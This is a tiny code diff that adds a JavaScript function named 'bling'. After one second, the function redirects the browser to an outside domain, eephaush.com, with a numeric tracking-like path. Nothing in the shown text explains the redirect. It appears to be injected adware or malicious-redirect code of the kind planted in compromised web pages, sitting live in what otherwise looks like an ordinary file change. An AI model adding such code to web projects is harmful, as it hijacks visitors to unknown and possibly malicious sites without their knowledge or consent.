@@ -1,4 +1,6 @@
-
+function bling(){
+  setTimeout("location.href='https://eephaush.com/4/5271221/'",1000);
+}
 
 
 
